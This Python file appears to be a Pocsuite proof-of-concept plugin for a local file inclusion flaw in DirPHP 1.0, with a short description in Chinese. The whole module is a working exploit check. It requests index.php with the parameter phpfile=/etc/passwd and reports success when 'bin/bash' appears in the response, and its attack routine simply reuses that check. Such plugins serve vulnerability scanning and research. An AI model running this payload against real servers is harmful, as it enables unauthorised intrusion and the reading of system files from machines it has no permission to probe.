#!/usr/bin/env python
# -*- coding:utf-8 -*-



from pocsuite.net import req

from pocsuite.poc import Output, POCBase

from pocsuite.utils import register



class TestPOC(POCBase):

    vulID = '87159'

    version = '1'

    vulDate = '1406390400'

    createDate = '1442937600'

    references = ['http://www.sebug.net/vuldb/ssvid-87159']

    name = 'DirPHP LFI Vulnerability'

    appPowerLink = 'http://sourceforge.net/projects/dirphp/'

    appName = 'DirPHP'

    appVersion = '1.0'

    vulType = 'Local File Inclusion'

    desc = '''DirPHP index.php文件在处理传入的参数时存在缺陷，导致产生本地文件包含漏洞。'''

    samples = ['']



    def _attack(self):

        return self._verify()



    def _verify(self, verify=True):

        result = {}

        vul_url = '%s/index.php?phpfile=/etc/passwd' % self.url

        response = req.get(vul_url, timeout=10).content



        if 'bin/bash' in response:

            result['VerifyInfo'] = {}

            result['VerifyInfo']['URL'] = self.url



        return self.parse_attack(result)



    def parse_attack(self, result):

        output = Output(self)



        if result:

            output.success(result)

        else:

            output.fail('failed')



        return output

register(TestPOC)